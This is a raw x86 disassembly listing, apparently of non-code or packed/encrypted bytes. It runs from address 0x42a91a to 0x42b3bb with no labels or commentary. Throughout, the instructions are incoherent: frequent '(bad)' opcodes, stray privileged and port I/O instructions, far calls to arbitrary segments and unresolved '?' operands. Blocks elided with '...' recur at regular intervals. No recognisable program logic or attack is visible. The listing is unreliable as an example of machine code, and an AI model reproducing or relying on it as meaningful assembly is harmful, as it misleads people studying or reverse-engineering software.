  42a91a:	jb     0x42a911
  42a91c:	daa    
  42a91d:	adc    eax,0xdc32654b
  42a922:	cli    
  42a923:	fidivr WORD PTR [esi-0x6ef972e9]
  42a929:	adc    al,0xd0
  42a92b:	xchg   edi,eax
  42a92c:	ja     0x42a999
  42a92e:	sti    
  42a92f:	mov    dh,BYTE PTR [edx-0x50932aa]
  42a935:	fbld   TBYTE PTR [ecx-0x4cf316fc]
  42a93b:	icebp  
  42a93c:	adc    BYTE PTR [esi-0x78],al
  42a93f:	fadd   QWORD PTR [edi]
  42a941:	mov    edx,0xd8ce2f54
  42a946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a947:	sbb    DWORD PTR [ecx+0x4b9f3d03],0xae1a4931
  42a951:	or     esi,DWORD PTR [eax]
  42a953:	xor    BYTE PTR [eax+0x3a],al
  42a956:	jl     0x42a9b3
  42a958:	(bad)  
  42a959:	jmp    0x2da20f78
  42a95e:	add    dh,BYTE PTR [ebx]
  42a960:	dec    ebx
  42a961:	sub    esi,edi
  42a963:	mov    eax,0x13bf8e58
  42a968:	int    0x6c
  42a96a:	mov    dh,0x6
  42a96c:	cmp    DWORD PTR [ebp+0x75],0xc06ae139
  42a973:	xor    esi,DWORD PTR [esi+eiz*2+0x32]
  42a977:	sub    BYTE PTR [edi],dh
  42a979:	jl     0x42a987
  42a97b:	or     DWORD PTR [ecx-0x2f],ebp
  42a97e:	pusha  
  42a97f:	(bad)  
  42a980:	fs add edx,esi
  42a983:	in     al,dx
  42a984:	ds loop 0x42a94c
  42a987:	push   ecx
  42a988:	cmp    cl,BYTE PTR [ebx-0x78]
  42a98b:	sub    DWORD PTR [edi+0x2f3974e0],edi
  42a991:	xor    BYTE PTR [ebp+0x5c8de495],ch
  42a997:	xor    edi,ebx
  42a999:	push   esp
  42a99a:	cmp    DWORD PTR [ecx-0x681928de],eax
  42a9a0:	jnp    0x42aa0a
  42a9a2:	and    BYTE PTR [eax],dl
  42a9a4:	or     eax,0xba63627c
  42a9a9:	and    DWORD PTR [edx+0x78],0x42
  42a9ad:	fwait
  42a9ae:	mov    ebp,cs
  42a9b0:	cs sbb eax,0x70fd5cf5
  42a9b6:	in     al,dx
  42a9b7:	push   ecx
  42a9b8:	loop   0x42aa1a
  42a9ba:	adc    dl,ah
  42a9bc:	inc    esp
  42a9bd:	scas   eax,DWORD PTR es:[edi]
  42a9be:	adc    ebx,0xef
	...
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	fsub   QWORD PTR [edi]
  42aa42:	hlt    
  42aa43:	adc    al,0x94
  42aa45:	ret    
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	cmc    
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    dl,bl
  42aa4d:	popf   
  42aa4e:	jp     0x42aa2d
  42aa50:	mov    esp,?
  42aa52:	cmp    DWORD PTR gs:[edx-0x5f],0xffffffac
  42aa57:	jb     0x42a9ff
  42aa59:	jp     0x42aa81
  42aa5b:	(bad)  
  42aa5c:	std    
  42aa5d:	daa    
  42aa5e:	mov    ch,cl
  42aa60:	in     eax,dx
  42aa61:	adc    ch,bh
  42aa63:	dec    eax
  42aa64:	fsub   QWORD PTR [ebp+0x61]
  42aa67:	scas   al,BYTE PTR es:[edi]
  42aa68:	in     al,dx
  42aa69:	es imul ebp,ecx,0x10
  42aa6d:	test   eax,0xd036439d
  42aa72:	jp     0x42aab4
  42aa74:	adc    eax,0x6b04f717
  42aa79:	and    eax,0x4c527536
  42aa7e:	xor    dl,0xdc
  42aa81:	sub    BYTE PTR [ebp+0x6c],al
  42aa84:	push   0xcb6dceae
  42aa89:	pop    es
  42aa8a:	mov    BYTE PTR [edx+0x2fb61c29],0x12
  42aa91:	mov    cl,0xb3
  42aa93:	imul   DWORD PTR [ecx+edi*2]
  42aa96:	and    al,0x33
  42aa98:	aaa    
  42aa99:	add    BYTE PTR [edi+0x26],0xf1
  42aa9d:	add    al,0x44
  42aa9f:	outs   dx,DWORD PTR ds:[esi]
  42aaa0:	ror    DWORD PTR [edx],0x5e
  42aaa3:	sbb    BYTE PTR [esi+0x7a],ah
  42aaa6:	mov    ebp,0x69b0df50
  42aaab:	scas   eax,DWORD PTR es:[edi]
  42aaac:	out    dx,eax
  42aaad:	mov    DWORD PTR [esi-0x2fbc9eb],edx
  42aab3:	scas   al,BYTE PTR es:[edi]
  42aab4:	mov    DWORD PTR ds:0xfe17a012,edi
  42aaba:	or     eax,0x5822ee92
  42aabf:	jle    0x42aa71
  42aac1:	imul   esi,ebx,0x1266b8fd
  42aac7:	dec    ecx
  42aac8:	dec    ebx
  42aac9:	jmp    0x42aaa8
  42aacb:	and    eax,0x851c19e5
  42aad0:	loopne 0x42ab28
  42aad2:	inc    edx
  42aad3:	mov    esi,0xe94587f7
  42aad8:	mov    cl,0x15
  42aada:	dec    eax
  42aadb:	add    esp,edx
  42aadd:	stos   BYTE PTR es:[edi],al
  42aade:	xchg   ebp,eax
  42aadf:	lds    eax,FWORD PTR [eax-0x7d]
  42aae2:	add    eax,0x45da54c5
  42aae7:	adc    dl,BYTE PTR [ebx-0x3a10aa3d]
  42aaed:	cmc    
  42aaee:	addr16 inc ecx
  42aaf0:	cmp    edi,DWORD PTR [edx]
  42aaf2:	push   edx
  42aaf3:	mov    al,ds:0x963f3360
  42aaf8:	icebp  
  42aaf9:	mov    cs,WORD PTR ds:[eax]
  42aafc:	mov    bl,0x18
  42aafe:	shr    dl,1
  42ab00:	popf   
  42ab01:	and    esp,DWORD PTR [eax+0x123c6f5d]
  42ab07:	aaa    
  42ab08:	pop    edi
  42ab09:	xchg   ebx,eax
  42ab0a:	sbb    BYTE PTR [ecx],cl
  42ab0c:	cmp    cl,BYTE PTR [eax+ebp*8-0x5b2f6e30]
  42ab13:	retf   
  42ab14:	je     0x42ab07
  42ab16:	sub    dh,BYTE PTR [edi]
  42ab18:	mov    ch,0x3b
  42ab1a:	test   cl,0x3a
  42ab1d:	jecxz  0x42ab39
  42ab1f:	clc    
  42ab20:	retf   
  42ab21:	fsubp  st(0),st
  42ab23:	inc    edx
  42ab24:	adc    al,0x92
  42ab26:	scas   al,BYTE PTR es:[edi]
  42ab27:	add    bl,bl
  42ab29:	xchg   ebx,eax
  42ab2a:	add    dh,BYTE PTR [ebx]
  42ab2c:	dec    eax
  42ab2d:	jno    0x42aba7
  42ab2f:	adc    DWORD PTR [edi+0x5f],esp
  42ab32:	push   cs
  42ab33:	shl    DWORD PTR [eax],1
  42ab35:	icebp  
  42ab36:	pushf  
  42ab37:	cmp    eax,0x91b51c8f
  42ab3c:	jns    0x42ab5d
  42ab3e:	xlat   BYTE PTR ds:[ebx]
  42ab3f:	stos   DWORD PTR es:[edi],eax
  42ab40:	std    
	...
  42abb1:	add    BYTE PTR [eax],al
  42abb3:	add    BYTE PTR [ebx-0x487759ea],ah
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	lds    eax,FWORD PTR [ebx-0x3b7601d8]
  42abc6:	add    DWORD PTR [eax],eax
  42abc8:	cmc    
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [esp+esi*4+0x6dbaf16c],bh
  42abd2:	xor    BYTE PTR [edi+0x23],ah
  42abd5:	sbb    ah,ah
  42abd7:	das    
  42abd8:	mov    esi,0xac9cd064
  42abdd:	addr16 dec esi
  42abdf:	mov    ds:0xc00691c1,eax
  42abe4:	cwde   
  42abe5:	aas    
  42abe6:	add    ah,BYTE PTR [ebp-0x70b16b43]
  42abec:	push   ecx
  42abed:	mov    esi,0xc4792af1
  42abf2:	mov    ch,0x3c
  42abf4:	or     eax,0x2366489e
  42abf9:	pand   mm4,QWORD PTR [edx-0x9d1d1fc]
  42ac00:	dec    esp
  42ac01:	mov    edi,?
  42ac03:	jecxz  0x42ac1f
  42ac05:	jle    0x42ac6e
  42ac07:	mov    esp,0x116aab81
  42ac0c:	out    dx,eax
  42ac0d:	dec    esp
  42ac0e:	and    esp,DWORD PTR [edi-0x50]
  42ac11:	add    al,0xff
  42ac13:	ja     0x42aba8
  42ac15:	cmp    eax,0xfc4b68bc
  42ac1a:	adc    BYTE PTR [edx],cl
  42ac1c:	aad    0x83
  42ac1e:	or     al,0x21
  42ac20:	jl     0x42ac10
  42ac22:	push   cs
  42ac23:	mov    DWORD PTR [ebx-0x4a94e0fb],ecx
  42ac29:	and    BYTE PTR [eax],dl
  42ac2b:	mov    ecx,0xb002030a
  42ac30:	enter  0x4066,0x9f
  42ac34:	xor    al,0x51
  42ac37:	imul   ebp,esi,0x12f4d9e8
  42ac3d:	inc    eax
  42ac3e:	push   ebx
  42ac3f:	loop   0x42abcb
  42ac41:	sti    
  42ac42:	dec    ebx
  42ac43:	mov    ?,WORD PTR [ecx+0x7c00d90]
  42ac49:	lock stc 
  42ac4b:	sub    eax,0xb8b634e4
  42ac50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac51:	mov    BYTE PTR [edi-0x63],0xc3
  42ac55:	mov    cl,0x21
  42ac57:	add    DWORD PTR [ecx],edi
  42ac59:	shr    BYTE PTR [edi],0x24
  42ac5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac5d:	arpl   WORD PTR [edx-0x70],dx
  42ac60:	test   al,0xa8
  42ac62:	aad    0xc6
  42ac64:	lahf   
  42ac65:	ss inc ebp
  42ac67:	adc    eax,0x3dbcb4e7
  42ac6c:	ror    DWORD PTR [esi+0x1],0x76
  42ac70:	cmp    BYTE PTR [ebp-0x107fc02b],dl
  42ac76:	pop    edi
  42ac77:	push   edx
  42ac78:	sub    al,0x42
  42ac7a:	(bad)  
  42ac7b:	jo     0x42acdc
  42ac7d:	inc    ebp
  42ac7e:	mov    ah,0x64
  42ac80:	adc    esp,DWORD PTR [ecx-0x25b1b5c6]
  42ac86:	xor    DWORD PTR gs:[eax],0xffffffdb
  42ac8a:	xchg   BYTE PTR [eax+ebp*4+0x19],bl
  42ac8e:	imul   eax,esi,0xffffffab
  42ac91:	hlt    
  42ac92:	addr16 loop 0x42ac15
  42ac95:	add    dl,0x1c
  42ac98:	xor    al,BYTE PTR [eax]
  42ac9a:	lock test DWORD PTR [esi+ecx*4+0x27],esi
  42ac9f:	in     eax,0xd8
  42aca1:	(bad)  
  42aca2:	lods   al,BYTE PTR ds:[esi]
  42aca3:	dec    ebx
  42aca4:	stc    
  42aca5:	xor    eax,0xfd3cd3e3
  42acaa:	jg     0x42ac70
  42acac:	mov    ebx,0xdb6dabb0
  42acb1:	ficom  WORD PTR [eax+0x417784f0]
  42acb7:	xchg   bh,dl
  42acb9:	fst    QWORD PTR [edx+0x5e78ad12]
  42acbf:	xor    al,0x36
	...
  42ad31:	add    BYTE PTR [eax],al
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	movhps xmm4,QWORD PTR [ecx-0x3a814a97]
  42ad46:	add    DWORD PTR [eax],eax
  42ad48:	cmc    
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    BYTE PTR [edi],bl
  42ad4d:	adc    BYTE PTR ds:0x89b2a56b,0x33
  42ad54:	inc    ebp
  42ad55:	test   al,0xa9
  42ad57:	mov    ds:0xda8cf02e,al
  42ad5c:	adc    cl,BYTE PTR [ebx+edi*4]
  42ad5f:	pop    ebp
  42ad60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad61:	fs mov edx,0xd0b19749
  42ad67:	and    ecx,0xffffffd2
  42ad6a:	mov    al,0xcd
  42ad6c:	adc    eax,0x98c59dee
  42ad71:	mov    ds:0x86827dbb,eax
  42ad76:	xchg   ebp,eax
  42ad77:	retf   
  42ad78:	xchg   ebx,eax
  42ad79:	inc    esp
  42ad7a:	scas   eax,DWORD PTR es:[edi]
  42ad7b:	cdq    
  42ad7c:	ja     0x42ad34
  42ad7e:	mov    bh,ah
  42ad80:	mov    edx,0xe1d35257
  42ad85:	retf   
  42ad86:	mov    WORD PTR [edx],es
  42ad88:	sub    BYTE PTR [ebx+0x1a5baebb],ah
  42ad8e:	clc    
  42ad8f:	stos   BYTE PTR es:[edi],al
  42ad90:	xchg   esi,eax
  42ad91:	int3   
  42ad92:	retf   
  42ad93:	cmp    al,BYTE PTR [ebx+0x3320811b]
  42ad99:	(bad)  
  42ad9b:	mov    bh,0x59
  42ad9d:	(bad)  
  42ad9e:	jns    0x42ad9d
  42ada0:	call   0xd6ac2471
  42ada5:	arpl   WORD PTR [ebx],dx
  42ada7:	or     edx,DWORD PTR [esi-0x2b]
  42adaa:	adc    DWORD PTR [ebp+0x1a412ab9],ebx
  42adb0:	push   ebp
  42adb1:	enter  0x8e1e,0xc0
  42adb5:	ficom  WORD PTR [edx+0x78]
  42adb8:	xchg   ecx,eax
  42adb9:	add    bh,0x8a
  42adbc:	mov    ds:0xedaf3531,eax
  42adc1:	cmp    al,0xa4
  42adc3:	pop    edi
  42adc4:	shr    BYTE PTR [ecx+0x7df29c77],cl
  42adca:	xchg   edx,eax
  42adcb:	call   0x96b73d56
  42add0:	cmp    DWORD PTR [edx-0x2],esi
  42add3:	aas    
  42add4:	adc    edi,esi
  42add6:	das    
  42add7:	jle    0x42adc6
  42add9:	lods   al,BYTE PTR ds:[esi]
  42adda:	daa    
  42addb:	mov    DWORD PTR [ebp-0x6c],esi
  42adde:	enter  0xa478,0xb7
  42ade2:	fs inc ecx
  42ade4:	dec    esp
  42ade5:	daa    
  42ade6:	mov    DWORD PTR ds:0x9044e382,esp
  42adec:	push   eax
  42aded:	retf   0xc642
  42adf0:	gs or  ebp,edi
  42adf3:	xchg   ecx,eax
  42adf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adf5:	imul   eax,DWORD PTR [edx-0x61065db2],0x7e
  42adfc:	push   edi
  42adfd:	outs   dx,DWORD PTR ds:[esi]
  42adfe:	push   eax
  42adff:	ret    
  42ae00:	fistp  WORD PTR [esi+0x704bc9d9]
  42ae06:	pop    es
  42ae07:	push   ebp
  42ae08:	lods   al,BYTE PTR ds:[esi]
  42ae09:	jnp    0x42ae2d
  42ae0b:	pop    ds
  42ae0c:	add    BYTE PTR [eax-0x6394a504],0x6c
  42ae13:	add    ebx,esp
  42ae15:	gs lahf 
  42ae17:	stos   DWORD PTR es:[edi],eax
  42ae18:	cdq    
  42ae19:	sahf   
  42ae1a:	in     al,0x57
  42ae1c:	mov    ds:0x8c8fce25,al
  42ae21:	xchg   esi,eax
  42ae22:	pop    edx
  42ae23:	rcl    bl,cl
  42ae25:	daa    
  42ae26:	add    al,0xf6
  42ae28:	call   0x9fa2:0x9b3bc1c6
  42ae2f:	cs jg  0x42ae1d
  42ae32:	inc    esp
  42ae33:	pop    ds
  42ae34:	iret   
  42ae35:	push   cs
  42ae36:	sbb    al,0x44
  42ae38:	rcr    eax,cl
  42ae3a:	aad    0xe1
  42ae3c:	sahf   
  42ae3d:	aas    
  42ae3e:	pop    ecx
  42ae3f:	fld    QWORD PTR [ebp+0x0]
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	sar    DWORD PTR [eax+edx*1+0x1c67325],1
  42aec7:	add    ch,dh
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    ah,cl
  42aecd:	cmp    al,0xed
  42aecf:	push   0xffffffce
  42aed1:	(bad)  
  42aed2:	or     al,0xe6
  42aed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aed5:	js     0x42aef9
  42aed7:	cwde   
  42aed8:	mov    dl,0xd3
  42aeda:	sbb    DWORD PTR [esi+0x15],edx
  42aedd:	pushf  
  42aede:	sbb    ah,dl
  42aee0:	xlat   BYTE PTR ds:[ebx]
  42aee1:	and    al,0x32
  42aee3:	mov    edi,0x31216ce
  42aee8:	stc    
  42aee9:	pop    ss
  42aeea:	sub    BYTE PTR [edx],al
  42aeec:	cdq    
  42aeed:	push   cs
  42aeee:	add    dl,cl
  42aef0:	mov    bh,0xb7
  42aef2:	out    0x1f,eax
  42aef4:	pushf  
  42aef5:	or     eax,0xa35633a1
  42aefa:	sahf   
  42aefb:	inc    ebx
  42aefc:	mov    edx,DWORD PTR [eax+0x53]
  42aeff:	icebp  
  42af00:	and    al,0xbf
  42af02:	push   edx
  42af03:	sbb    BYTE PTR [eax-0xe],ah
  42af06:	inc    edx
  42af07:	idiv   DWORD PTR [ebx]
  42af09:	retfw  0x1f68
  42af0d:	push   edx
  42af0e:	xchg   ecx,eax
  42af0f:	or     BYTE PTR [edi+0x65ead3a9],cl
  42af15:	mov    ebp,ds
  42af17:	jno    0x42af56
  42af19:	pop    es
  42af1a:	lahf   
  42af1b:	adc    eax,0x220d52fc
  42af20:	sub    al,0x63
  42af22:	push   0xf711f949
  42af27:	adc    BYTE PTR [eax*2-0x72058268],dh
  42af2e:	xchg   esi,eax
  42af2f:	push   0xffffff9a
  42af31:	shl    BYTE PTR [ebx],cl
  42af33:	jl     0x42af9f
  42af35:	lds    edi,FWORD PTR [ebp-0x80]
  42af38:	sbb    bh,cl
  42af3a:	fdivp  st(2),st
  42af3c:	xor    DWORD PTR [edi],edx
  42af3e:	pop    eax
  42af3f:	mov    cl,BYTE PTR [eax+0x384254ca]
  42af45:	nop
  42af46:	rcl    DWORD PTR [ebp+ecx*1+0x7f35c5d0],1
  42af4d:	int    0x25
  42af4f:	push   esi
  42af50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af51:	cmp    esi,esp
  42af53:	fcom   st(1)
  42af55:	pushf  
  42af56:	mov    al,ds:0x3884f695
  42af5b:	jg     0x42af1e
  42af5d:	out    dx,eax
  42af5e:	or     al,0x78
  42af60:	lahf   
  42af61:	cmp    bh,BYTE PTR [esi+0x5bb5b6c4]
  42af67:	adc    cl,ch
  42af69:	aas    
  42af6a:	sub    ebp,esi
  42af6c:	(bad)  
  42af6d:	out    0xd5,al
  42af6f:	lock mov eax,DWORD PTR [esi+0x6dd09922]
  42af76:	adc    esp,DWORD PTR [ecx]
  42af78:	jle    0x42af47
  42af7a:	and    al,0xb1
  42af7c:	or     al,0x8d
  42af7e:	ss out 0x8,al
  42af81:	mov    bl,0xa8
  42af83:	inc    ecx
  42af84:	mov    al,ds:0x2c2a9d93
  42af89:	and    eax,0xf1133fc6
  42af8e:	or     cl,BYTE PTR [eax-0x6b91b904]
  42af94:	xchg   ebx,eax
  42af95:	sbb    eax,0xeefe22a4
  42af9a:	push   eax
  42af9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af9c:	cwde   
  42af9d:	mov    eax,0xfaa4490a
  42afa2:	xor    edx,DWORD PTR [esp+ebp*1-0x7f]
  42afa6:	pop    esp
  42afa7:	scas   al,BYTE PTR es:[edi]
  42afa8:	mov    edi,edi
  42afaa:	mov    esi,0x8435efda
  42afaf:	jge    0x42b017
  42afb1:	mov    al,ds:0x33d17155
  42afb6:	or     al,0xd4
  42afb8:	adc    DWORD PTR [ebp+0x5c1089eb],esp
  42afbe:	dec    ebx
  42afbf:	push   edx
  42afc0:	or     eax,0x0
	...
  42b031:	add    BYTE PTR [eax],al
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x50fb
  42b042:	xlat   BYTE PTR ds:[ebx]
  42b043:	popf   
  42b044:	push   0xf50001c7
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [edx+0x2c388167],dl
  42b051:	and    eax,0xadd17217
  42b056:	jo     0x42b069
  42b058:	inc    edi
  42b059:	icebp  
  42b05a:	cwde   
  42b05b:	aad    0xe3
  42b05d:	mov    ecx,0xe1ac5a8f
  42b062:	imul   edx,DWORD PTR [esp+eiz*4-0x144a8f68],0x4d9c97d0
  42b06d:	mov    al,0x3e
  42b06f:	ret    0x7bad
  42b072:	fsub   QWORD PTR [eax-0x79854565]
  42b078:	std    
  42b079:	mov    edi,0x3e8ac040
  42b07e:	push   edi
  42b07f:	pop    ebp
  42b080:	mov    ecx,DWORD PTR [esi+0x3401ea1a]
  42b086:	scas   al,BYTE PTR es:[edi]
  42b087:	call   0x1aeb:0xaa9ccfe4
  42b08e:	pop    ecx
  42b08f:	(bad)  
  42b091:	sub    BYTE PTR [esi+0x31c2e012],ch
  42b097:	push   edx
  42b098:	sahf   
  42b099:	push   edi
  42b09a:	pop    edx
  42b09b:	dec    eax
  42b09c:	mov    esp,0xf1a8c910
  42b0a1:	xchg   BYTE PTR [ebx-0x4],cl
  42b0a4:	fs pop ecx
  42b0a6:	adc    BYTE PTR [edi],bl
  42b0a8:	mov    DWORD PTR [esi+edx*4-0x509fca2a],eax
  42b0af:	or     BYTE PTR [edx+edx*8+0x5689ff01],0x8f
  42b0b7:	out    0xd2,eax
  42b0b9:	std    
  42b0ba:	imul   esi,DWORD PTR [edx-0x2c],0x2
  42b0be:	fwait
  42b0bf:	jae    0x42b0d2
  42b0c1:	lahf   
  42b0c2:	or     esi,DWORD PTR [edx-0x1f7e283]
  42b0c8:	mov    esp,0xd551a390
  42b0cd:	cmp    esp,DWORD PTR [edx+0x1b]
  42b0d0:	push   edi
  42b0d1:	adc    al,0x7b
  42b0d4:	sar    cl,0x66
  42b0d7:	nop
  42b0d8:	mov    dl,dh
  42b0da:	in     eax,0xa9
  42b0dc:	inc    edx
  42b0dd:	bound  ecx,QWORD PTR [esi]
  42b0df:	push   ebp
  42b0e0:	xchg   edi,eax
  42b0e1:	ja     0x42b068
  42b0e3:	ret    
  42b0e4:	rol    DWORD PTR [ebp+0x53fc3a57],cl
  42b0ea:	imul   ecx,DWORD PTR [edx],0xa013a880
  42b0f0:	add    esp,ebp
  42b0f2:	mov    ch,0x21
  42b0f4:	xor    DWORD PTR [ecx+0x45],0xc4095ea2
  42b0fb:	aaa    
  42b0fc:	leave  
  42b0fd:	bndstx [eax-0x29],bnd1
  42b101:	cmp    BYTE PTR [eax],bl
  42b103:	(bad)  [edi]
  42b105:	xchg   edi,eax
  42b106:	jmp    0x5dc2:0xff5525dd
  42b10d:	adc    eax,0xe75660c
  42b112:	idiv   BYTE PTR [edx]
  42b114:	in     eax,dx
  42b115:	in     al,0x91
  42b117:	mov    ecx,0x4c8679c5
  42b11c:	aam    0xb0
  42b11e:	ds ja  0x42b151
  42b121:	push   esi
  42b122:	adc    al,0x93
  42b124:	std    
  42b125:	adc    DWORD PTR [edi-0x2a],esi
  42b128:	jl     0x42b0b8
  42b12a:	cmp    al,0x1c
  42b12c:	ror    DWORD PTR [ebp+0x7a],1
  42b12f:	mov    al,ds:0x1318b703
  42b134:	iret   
  42b135:	jl     0x42b1a1
  42b137:	jg     0x42b0d4
  42b139:	cmp    esi,DWORD PTR [ebx-0x2b5a02c6]
  42b13f:	loop   0x42b158
	...
  42b1b1:	add    BYTE PTR [eax],al
  42b1b3:	add    BYTE PTR [ebx],ch
  42b1b5:	test   DWORD PTR [ebp-0x50e640e7],edx
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	rcr    DWORD PTR [edi],0xf8
  42b1c3:	adc    ebx,DWORD PTR [ebp-0x38]
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	cmc    
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    BYTE PTR [edx+0x2e],bl
  42b1ce:	out    0xf3,eax
  42b1d0:	fstp   QWORD PTR [edx+0x70]
  42b1d3:	rcr    BYTE PTR [ecx+0x1f],1
  42b1d6:	sbb    BYTE PTR [ecx-0x1b3ad6e9],0x77
  42b1dd:	pusha  
  42b1de:	test   al,0xb3
  42b1e0:	or     DWORD PTR [ecx],eax
  42b1e2:	inc    esp
  42b1e3:	mov    ebp,?
  42b1e5:	cld    
  42b1e6:	les    eax,FWORD PTR [ebx-0x1f]
  42b1e9:	xchg   edi,eax
  42b1ea:	dec    eax
  42b1eb:	leave  
  42b1ec:	sbb    DWORD PTR [eax+0x37],ebp
  42b1ef:	sub    esp,DWORD PTR [edx-0x2089b602]
  42b1f5:	and    cl,BYTE PTR [edi+eiz*2-0x33127312]
  42b1fc:	mov    cl,BYTE PTR [ebx-0x51ffd99d]
  42b202:	aam    0x2d
  42b204:	add    al,0x26
  42b206:	cdq    
  42b207:	jg     0x42b278
  42b209:	xor    BYTE PTR gs:[edx],ch
  42b20c:	fimul  WORD PTR [ecx-0x3e813b52]
  42b212:	push   0x76
  42b214:	aas    
  42b215:	dec    ebx
  42b216:	loopne 0x42b1ca
  42b218:	fisttp QWORD PTR [ecx+0x23]
  42b21b:	add    ebx,0x2c
  42b21e:	in     eax,dx
  42b21f:	cld    
  42b220:	xor    DWORD PTR [ebx-0x24a37cce],eax
  42b226:	sub    DWORD PTR [edi-0x73],ecx
  42b229:	call   0x400a:0x9601f2f9
  42b230:	call   0x6eba8d0b
  42b235:	bound  ebp,QWORD PTR [ecx]
  42b237:	xchg   edi,eax
  42b238:	xor    eax,0x4c4e2e2
  42b23d:	frstor [ebx+0x59]
  42b240:	mov    ch,0xe2
  42b242:	(bad)  
  42b244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b245:	mov    ah,0x7a
  42b247:	loop   0x42b277
  42b249:	or     eax,0x900c7780
  42b24e:	xor    eax,0x5760cb6c
  42b253:	jmp    FWORD PTR [edi]
  42b255:	pop    esp
  42b256:	aam    0x2a
  42b258:	lods   al,BYTE PTR ds:[esi]
  42b259:	fdivr  st(4),st
  42b25b:	mov    BYTE PTR [ecx+ebp*2+0x5],al
  42b25f:	jle    0x42b299
  42b261:	push   es
  42b262:	sub    ah,BYTE PTR [ecx-0x5f]
  42b265:	mov    al,ds:0x47ce040a
  42b26a:	add    eax,eax
  42b26c:	jo     0x42b23e
  42b26e:	mov    edi,0xff525c14
  42b273:	(bad)  
  42b274:	out    dx,al
  42b275:	enter  0x5938,0x77
  42b279:	push   edx
  42b27a:	bound  esp,QWORD PTR [esi-0x12]
  42b27d:	(bad)  
  42b27e:	sbb    eax,0x23299aae
  42b283:	into   
  42b284:	retf   0x7e0
  42b287:	add    BYTE PTR [ecx-0xf],ch
  42b28a:	cmp    BYTE PTR [ebp-0x6f7c4f2f],cl
  42b290:	iret   
  42b291:	xor    eax,0x2b665f87
  42b296:	sub    BYTE PTR [esi+0x3c],al
  42b299:	loopne 0x42b2a6
  42b29b:	sar    DWORD PTR [eax],1
  42b29d:	pop    ds
  42b29e:	adc    edx,DWORD PTR [ecx+esi*4]
  42b2a1:	out    dx,al
  42b2a2:	xor    eax,0x71230bb1
  42b2a7:	(bad)  
  42b2a8:	fmul   QWORD PTR [ecx+eiz*4]
  42b2ab:	add    al,ah
  42b2ad:	mov    BYTE PTR [eax+0x1d6daaf7],bh
  42b2b3:	ret    
  42b2b4:	call   0x8960:0x6c437592
  42b2bb:	mov    bl,0x18
  42b2bd:	aad    0xba
  42b2bf:	sahf   
  42b2c0:	push   ebx
	...
  42b331:	add    BYTE PTR [eax],al
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax+0x47],esi
  42b341:	rcr    BYTE PTR ds:0x1c9520b,cl
  42b347:	add    ch,dh
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    bl,bl
  42b34d:	fucomip st,st(6)
  42b34f:	jg     0x42b3cd
  42b351:	fwait
  42b352:	ins    DWORD PTR es:[edi],dx
  42b353:	cld    
  42b354:	inc    edx
  42b355:	jecxz  0x42b37c
  42b357:	inc    eax
  42b358:	clc    
  42b359:	cmp    eax,0xb6a2b619
  42b35e:	pop    DWORD PTR [ebx+0x57]
  42b361:	cmp    DWORD PTR [ecx-0x12],edx
  42b364:	ja     0x42b3cd
  42b366:	adc    BYTE PTR [edx+0x77],ah
  42b369:	and    eax,0x332dfe47
  42b36e:	sbb    BYTE PTR [eax],dl
  42b370:	xor    eax,0x380ba16a
  42b375:	pushf  
  42b376:	ret    
  42b377:	mov    ah,0x2e
  42b379:	adc    DWORD PTR [ebx-0x40ae6d8],edx
  42b37f:	mov    esp,0xa3f6059b
  42b384:	daa    
  42b385:	fdivr  DWORD PTR [edi]
  42b387:	clc    
  42b388:	lahf   
  42b389:	mov    edx,0x9bf4a321
  42b38e:	(bad)  
  42b38f:	sbb    ch,dl
  42b391:	mov    WORD PTR [ecx-0x157da7f9],?
  42b397:	leave  
  42b398:	jnp    0x42b365
  42b39a:	add    ch,bl
  42b39c:	jmp    0x42b35b
  42b39e:	mov    ds:0x170433ee,eax
  42b3a3:	ret    
  42b3a4:	retf   
  42b3a5:	stos   DWORD PTR es:[edi],eax
  42b3a6:	stc    
  42b3a7:	popa   
  42b3a8:	fld    TBYTE PTR ds:0x7d6e20d6
  42b3ae:	test   eax,0x7e423c76
  42b3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3b4:	and    DWORD PTR [eax-0x80],0xb3c45898
  42b3bb:	retf   
